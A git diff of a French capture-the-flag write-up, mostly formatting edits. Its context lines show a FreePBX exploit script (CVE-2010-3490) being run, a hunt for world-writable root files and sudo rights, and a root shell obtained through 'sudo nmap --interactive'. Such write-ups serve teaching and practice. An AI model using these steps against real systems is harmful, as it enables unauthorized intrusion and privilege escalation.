@@ -159,7 +159,7 @@ else:
 
 L'upload passe correctement :  
 
-```
+```console
 $ python sploit.py 
 devloop exploit for FreePBX <= 2.8.0 (CVE-2010-3490)
 Usage: {0} <url_to_freepbx_admin_directory> <username> <password>
@@ -180,7 +180,7 @@ The way to root
 
 On trouve un fichier appartenant à root et word-writable qui semble d'aucune utilité :  
 
-```
+```console
 bash-3.2$ find / -user root -perm -o+w -type f 2> /dev/null  | grep -v /proc
 /var/spool/asterisk/voicemail/default/2000/INBOX/msg0001.txt
 bash-3.2$ cat /var/spool/asterisk/voicemail/default/2000/INBOX/msg0001.txt
@@ -202,9 +202,9 @@ flag=
 duration=1
 ```
 
-Par contre les permissions *sudo* sont visiblement à approfondir :  
+Par contre, les permissions *sudo* sont visiblement à approfondir :  
 
-```
+```console
 bash-3.2$ sudo -l
 Matching Defaults entries for asterisk on this host:
     env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY
@@ -223,7 +223,7 @@ On peut sinon utiliser *yum* pour installer un logiciel vulnérable et ensuite e
 
 Du coup, après un coup d’œil dans la page de manuel de *nmap*, je l'appelle en mode interactif et invoque */bin/bash* :  
 
-```
+```console
 bash-3.2$ sudo /usr/bin/nmap --interactive
 
 Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
